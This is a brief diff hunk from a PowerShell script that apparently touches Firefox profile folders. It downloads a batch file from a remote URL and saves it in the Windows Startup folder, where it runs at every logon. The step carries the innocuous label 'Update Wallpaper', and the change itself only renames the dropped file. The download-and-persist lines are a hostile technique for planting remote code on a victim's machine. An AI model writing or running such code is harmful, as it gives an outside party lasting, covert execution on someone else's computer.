@@ -10,4 +10,4 @@ get-childitem -path "$env:APPDATA/Mozilla/Firefox/Profiles" -Directory | %{$path
 
 # Update Wallpaper
 $updateWallpaper = (curl.exe -s "$url/update-wallpaper.bat" | out-string)
-set-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\UpdateWallpaper.bat" -value $updateWallpaper
+set-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\update-wallpaper.bat" -value $updateWallpaper
